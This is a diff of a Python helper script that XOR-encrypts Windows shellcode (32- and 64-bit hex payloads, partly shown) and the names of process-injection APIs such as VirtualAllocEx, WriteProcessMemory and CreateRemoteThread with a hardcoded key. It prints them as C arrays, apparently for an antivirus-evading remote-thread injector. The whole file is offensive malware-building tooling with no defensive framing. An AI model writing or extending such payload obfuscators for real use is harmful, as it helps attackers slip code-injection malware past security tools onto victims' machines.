@@ -1,14 +1,29 @@
-from pwn import xor
 
-IAT = {
-    "VirtualAllocEx": "",
-    "WriteProcessMemory": "", 
-    "CreateRemoteThread": "",
-    "WaitForSingleObject": "",
-    "VirtualFreeEx": "",
-}
+def xor(data: bytes, key: bytes) -> bytes:
+    klen = len(key)
+    return bytes(b ^ key[i % klen] for i, b in enumerate(data))
 
-key = "rzdhop_is_a_nice_guy".encode()
+API_NAMES = [
+    "VirtualAllocEx",
+    "WriteProcessMemory",
+    "CreateRemoteThread",
+    "WaitForSingleObject",
+    "VirtualFreeEx",
+]
+
+key = b"rzdhop_is_a_nice_guy" 
+
+def to_c_array(data: bytes, varname: str, ctype="UCHAR") -> str:
+    hex_vals = ", ".join(f"0x{b:02x}" for b in data)
+    return f"{ctype} {varname}[] = {{ {hex_vals} }};"
+
+
+
+for name in API_NAMES:
+    enc = xor(name.encode() + b"\x00", key)
+    c_name = name + "_enc"
+    print(to_c_array(enc, c_name))
+
 
 shellcode_32 = bytes.fromhex(
     "fce88f0000006031d289e5648b52308b520c8b52140fb74a268b722831ff31c0"
@@ -35,24 +50,11 @@ shellcode_64 = bytes.fromhex(
     "7505bb4713726f6a00594189daffd5"
 )
 
-# === XOR des shellcodes
 enc_shellcode_32 = xor(shellcode_32, key)
 enc_shellcode_64 = xor(shellcode_64, key)
 
-# === Dump C-style array
-def to_c_array(data, varname):
-    hex_vals = ', '.join(f'0x{b:02x}' for b in data)
-    return f"UCHAR {varname}[] = {{ {hex_vals} }};"
-
-print(to_c_array(enc_shellcode_32, "encoded_shellcode_32"))
+print(to_c_array(enc_shellcode_32, "shellcode_32"))
 print()
-print(to_c_array(enc_shellcode_64, "encoded_shellcode_64"))
-
-# Chiffrement des noms d'API
-for IA in IAT:
-    IAT[IA] = xor(IA.encode(), key).hex()
-
-# Dump
-for k, v in IAT.items():
-    print(f"{k} = {v}")
-print(f"Key = {key.hex()}")
+print(to_c_array(enc_shellcode_64, "shellcode_64"))
+print()
+print(to_c_array(key, "key"))
